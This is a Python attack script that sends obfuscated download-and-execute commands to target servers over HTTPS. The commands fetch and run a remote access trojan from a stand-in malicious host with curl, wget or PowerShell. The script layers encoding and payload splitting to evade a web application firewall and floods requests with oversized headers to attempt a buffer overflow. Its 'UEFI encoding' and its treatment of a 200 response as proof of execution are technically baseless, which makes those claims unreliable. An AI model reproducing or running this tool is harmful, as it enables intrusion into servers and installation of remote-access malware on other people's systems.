import requests
import binascii
import time
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disable warnings about unverified HTTPS requests
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Predefined list of RHOSTS
RHOSTS = [
    ""
]

external_payloads = []

# RAT (Remote Access Trojan) payloads
rat_payloads = [
    "curl -O http://malicious-site.com/rat.bin && chmod +x rat.bin && ./rat.bin",  # Download and execute RAT
    "wget http://malicious-site.com/rat.bin -O rat.bin && chmod +x rat.bin && ./rat.bin",  # Alternative download method
    "powershell -Command \"Invoke-WebRequest -Uri http://malicious-site.com/rat.exe -OutFile rat.exe; Start-Process rat.exe\""  # Windows PowerShell RAT download
]

# Function to encode payload with UEFI-specific encoding
def uefi_encode(payload):
    # First layer of encoding: Base64
    base64_encoded = binascii.b2a_base64(payload.encode()).decode().strip()

    # Second layer: Hex encoding
    hex_encoded = binascii.hexlify(base64_encoded.encode()).decode()

    # Third layer: Reversing the hex string to further obfuscate
    reversed_hex = hex_encoded[::-1]

    return reversed_hex

# Function to split and reassemble the payload
def split_and_reassemble(payload, chunk_size=50):
    # Split the payload into smaller chunks
    chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
    
    # Reassemble the payload with some separators to confuse the WAF
    reassembled = "||".join(chunks)
    
    return reassembled

# Convert each RAT command into a UEFI-obfuscated payload
payloads = []

def generate_payloads():
    global payloads
    payloads = []
    for cmd in rat_payloads:
        uefi_encoded_payload = uefi_encode(cmd)
        if uefi_encoded_payload:
            reassembled_payload = split_and_reassemble(uefi_encoded_payload)
            payloads.append(reassembled_payload)
    
    if external_payloads:
        print(f"Adding {len(external_payloads)} external payloads from file.")
        payloads.extend(external_payloads)

# Function to load external payloads from a .txt file
def load_external_payloads(file_path):
    global external_payloads
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r') as file:
                for line in file:
                    line = line.strip()
                    if line:
                        uefi_encoded_payload = uefi_encode(line)
                        if uefi_encoded_payload:
                            reassembled_payload = split_and_reassemble(uefi_encoded_payload)
                            external_payloads.append(reassembled_payload)
            print(f"Loaded {len(external_payloads)} payloads from {file_path}.")
        except Exception as e:
            print(f"Error loading payloads from file: {file_path}. Error: {e}")
    else:
        print(f"File not found: {file_path}. No external payloads loaded.")

# Function to perform the request on the specific IP, inject the payload, and handle the response
def inject_rat(ip, payload, iteration):
    url = f"https://{ip}:443"  # Explicitly targeting port 443
    headers = {}

    # Add random junk data to try and bypass WAF detection
    junk_data = "X" * 256  # Add 256 bytes of junk data
    payload_with_junk = payload + junk_data

    # Create a large number of headers to overflow the buffer
    for i in range(1024):  # Ensure buffer overflow is maximized
        if i == 1023:
            headers[f"Header-{i}"] = payload_with_junk  # Insert the payload with junk data in the last header
        else:
            headers[f"Header-{i}"] = "A" * 128  # Other headers have significant size

    try:
        print(f"[Iteration {iteration}] Sending UEFI-obfuscated payload to {ip}...")
        # Send the request with the payload to the target server's port 443 with a timeout of 15 seconds
        response = requests.get(url, headers=headers, verify=False, timeout=15)
        print(f"Payload injected to {ip}. Response code: {response.status_code}")

        # Only log successful attempts with a 200 OK response
        if response.status_code == 200:
            print(f"RAT payload executed successfully on {ip} (response: {response.status_code}).")
        else:
            print(f"RAT payload failed to execute on {ip} (response: {response.status_code}).")

        # Wait briefly before continuing to the next payload
        time.sleep(3)
    except requests.exceptions.RequestException as e:
        print(f"Error sending payload to {ip}: {e}")

# Main entry function
def init():
    # Get the number of iterations from the user
    iterations = input("Enter the number of iterations for the polyglot brute force function (default is 100): ").strip()
    if not iterations.isdigit():
        iterations = 100
    else:
        iterations = int(iterations)

    # Optionally load external payloads from a .txt file
    file_path = input("Enter the file path for additional payloads (leave blank if none): ").strip()
    if file_path:
        load_external_payloads(file_path)

    # Generate the payloads
    generate_payloads()

    # Iterate through each RHOST and payload, performing the requested number of iterations
    for rhost in RHOSTS:
        print(f"\n[*] Targeting {rhost}")
        for iteration in range(1, iterations + 1):
            for payload in payloads:
                inject_rat(rhost, payload, iteration)

# Start the script
if __name__ == "__main__":
    init()
